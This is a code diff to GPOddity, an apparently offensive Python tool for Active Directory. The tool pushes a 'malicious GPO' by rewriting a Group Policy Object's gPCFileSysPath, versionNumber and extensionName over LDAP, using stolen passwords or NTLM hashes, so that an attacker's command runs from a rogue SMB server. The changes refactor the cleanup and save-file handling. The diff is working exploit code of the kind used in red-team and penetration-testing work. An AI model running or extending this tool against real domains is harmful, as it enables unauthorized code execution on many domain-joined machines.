@@ -1,6 +1,7 @@
 import sys
 import typer
 import logging
+import traceback
 
 from time                           import sleep
 from impacket.ntlm                  import compute_lmhash, compute_nthash
@@ -18,9 +19,11 @@ from conf                           import OUTPUT_DIR, bcolors, GPOTypes
 
 
 
+
+
 def main(
-        gpo_id: Annotated[str, typer.Option(help="The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') ", rich_help_panel="General options")],
         domain: Annotated[str, typer.Option(help="The target domain", rich_help_panel="General options")],
+        gpo_id: Annotated[str, typer.Option(help="The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') ", rich_help_panel="General options")],
         username: Annotated[str, typer.Option(help="The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$')", rich_help_panel="General options")],
 
         command: Annotated[str, typer.Option(help="The command that should be executed through the malicious GPO", rich_help_panel="Malicious Group Policy Template generation options")] = None,
@@ -44,15 +47,50 @@ def main(
         ldaps: Annotated[bool, typer.Option("--ldaps", help="[Optional] Use LDAPS on port 636 instead of LDAP", rich_help_panel="General options")] = False,
         verbose: Annotated[bool, typer.Option("--verbose", help="[Optional] Enable verbose output", rich_help_panel="General options")] = False,
         no_smb_server: Annotated[bool, typer.Option("--no-smb-server", help="[Optional] Disable the smb server feature. GPOddity will only generate a malicious GPT, spoof the GPO location, wait, and cleanup", rich_help_panel="General options")] = False,
-        just_clean: Annotated[bool, typer.Option("--just-clean", help="[Optional] Only perform cleaning action from the values specified in the 'cleaning/to_clean.txt' file. May be useful to clean up in case of incomplete exploitation or ungraceful exit", rich_help_panel="General options")] = False
+        just_clean: Annotated[bool, typer.Option("--just-clean", help="[Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or ungraceful exit", rich_help_panel="General options")] = False,
+        clean_file: Annotated[str, typer.Option("--clean-file", help="[Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or absolute path", rich_help_panel="General options")] = None
 ):
     if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
     else: logging.basicConfig(format='%(message)s', level=logging.INFO)
     logger = logging.getLogger(__name__)
+    domain_dn = ",".join("DC={}".format(d) for d in domain.split("."))
+    gpo_dn = 'CN={' + gpo_id + '}},CN=Policies,CN=System,{}'.format(domain_dn)
+    if dc_ip is None:
+        dc_ip = domain
+
+    ### ============================= ###
+    ### In case we just want to clean ###
+    ### ============================= ###
+    
+    if just_clean is True:
+        if clean_file is None:
+            logger.error(f"[!] You provided the --just-clean flag without specifying the --clean-file argument.")
+            return
+        if username is None and (password is None and hash is None):
+            logger.error(f"[!] To perform cleaning, please provide valid credentials for a user having the necessary rights to update the GPO AD object.")
+            return
+    
+        logger.warning(f"\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
+        logger.warning("[*] Initiating LDAP connection")
+        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
+        if hash is not None:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
+        else:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
+        logger.warning(f"{bcolors.OKGREEN}[+] LDAP bind successful{bcolors.ENDC}")
+        clean(ldap_session, gpo_dn, clean_file)
+        logger.warning(f"{bcolors.OKGREEN}[+] All done (only cleaning). Exiting...{bcolors.ENDC}")
+        return
+
 
     ### ============================================= ###
     ### Performing some checks on arguments coherence ###
     ### ============================================= ###
+
+    if gpo_id is None or domain is None or username is None or command is None or (password is None and hash is None) or rogue_smbserver_ip is None or rogue_smbserver_share is None:
+        logger.error(f"[!] To run the exploit, you should provide at least a GPO id, a domain, a username and password/hash, a command, a rogue SMB server IP and a rogue SMB server share.")
+        return
+
     if no_smb_server is not True and "sysvol" in rogue_smbserver_share.lower() or "netlogon" in rogue_smbserver_share.lower():
         confirmation = typer.prompt("[!] You requested to run the embedded SMB server, but provided a share name that is by default protected by UNC path hardening. Are you sure you want to continue? [yes/no] ")
         if confirmation != 'yes':
@@ -63,31 +101,11 @@ def main(
         if confirmation != 'yes':
             return
     
-    if dc_ip is None:
-        dc_ip = domain
     if machine_name is None:
         machine_name = username
         machine_pass = password
         machine_hash = hash
     
-    domain_dn = ",".join("DC={}".format(d) for d in domain.split("."))
-    gpo_dn = 'CN={' + gpo_id + '}},CN=Policies,CN=System,{}'.format(domain_dn)
-
-    ### ============================= ###
-    ### In case we just want to clean ###
-    ### ============================= ###
-    if just_clean is True:
-        logger.warning(f"\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
-        logger.warning("[*] Initiating LDAP connection")
-        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
-        if hash is not None:
-            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
-        else:
-            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
-        logger.warning(f"{bcolors.OKGREEN}[+] LDAP bind successful{bcolors.ENDC}")
-        clean(ldap_session, gpo_dn)
-        logger.warning(f"{bcolors.OKGREEN}[+] All done (only cleaning). Exiting...{bcolors.ENDC}")
-        return
 
     
     ### =========================================================================== ###
@@ -140,7 +158,8 @@ def main(
     logger.warning(f"\n{bcolors.BOLD}=== SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ==={bcolors.ENDC}\n")
     
     # Prepare to save value to clean
-    init_save_file()
+    save_file_name = init_save_file(gpo_id)
+    logger.info(f"[*] The save file for current exploit run is {save_file_name}")
 
     # Modify gPCFileSysPath
     try:
@@ -150,9 +169,9 @@ def main(
         result = modify_attribute(ldap_session, gpo_dn, "gPCFileSysPath", smb_path)
         if result is not True: raise Exception
     except:
-            logger.critical(f"[!] Failed to modify the gPCFileSysPath aatribute of the target GPO. Exiting...")
+            logger.critical(f"[!] Failed to modify the gPCFileSysPath attribute of the target GPO. Exiting...")
             sys.exit(1)
-    save_attribute_value("gPCFileSysPath", initial_gpcfilesyspath)
+    save_attribute_value("gPCFileSysPath", initial_gpcfilesyspath, save_file_name)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully spoofed GPC gPCFileSysPath attribute{bcolors.ENDC}")
 
 
@@ -164,11 +183,11 @@ def main(
         result = modify_attribute(ldap_session, gpo_dn, "versionNumber", updated_version)
         if result is not True: raise Exception
     except:
-        logger.critical(f"[!] Failed to modify the gPCFileSysPath aatribute of the target GPO. Cleaning...")
-        clean(ldap_session, gpo_dn)
+        logger.critical(f"[!] Failed to modify the gPCFileSysPath attribute of the target GPO. Cleaning...")
+        clean(ldap_session, gpo_dn, save_file_name)
         logger.critical("[!] Exiting...")
         sys.exit(1)
-    save_attribute_value("versionNumber", versionNumber)
+    save_attribute_value("versionNumber", versionNumber, save_file_name)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC versionNumber attribute{bcolors.ENDC}")
 
     
@@ -182,10 +201,10 @@ def main(
         if result is not True: raise Exception
     except:
         logger.critical(f"[!] Failed to modify the extensionName atribute of the target GPO. Cleaning...")
-        clean(ldap_session, gpo_dn)
+        clean(ldap_session, gpo_dn, save_file_name)
         logger.critical("[!] Exiting...")
         sys.exit(1) 
-    save_attribute_value(attribute_name, extensionName)
+    save_attribute_value(attribute_name, extensionName, save_file_name)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC extensionName attribute{bcolors.ENDC}")
 
     try:
@@ -232,7 +251,23 @@ def main(
             ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
         else:
             ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
-        clean(ldap_session, gpo_dn)
+        clean(ldap_session, gpo_dn, save_file_name)
+    except:
+        logger.error(traceback.print_exc())
+        logger.error(f"{bcolors.FAIL}[!] Something went wrong. Cleaning and exiting...{bcolors.ENDC}\n")
+        ### =================================================== ###
+        ### Cleaning by restoring previous GPC attribute values ###
+        ### =================================================== ###
+        logger.warning(f"\n\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
+        # Reinitialize ldap connection, since cleaning can happen a long time after exploit launch
+        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
+        if hash is not None:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
+        else:
+            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
+        clean(ldap_session, gpo_dn, save_file_name)
+
+
 
 
 def entrypoint():
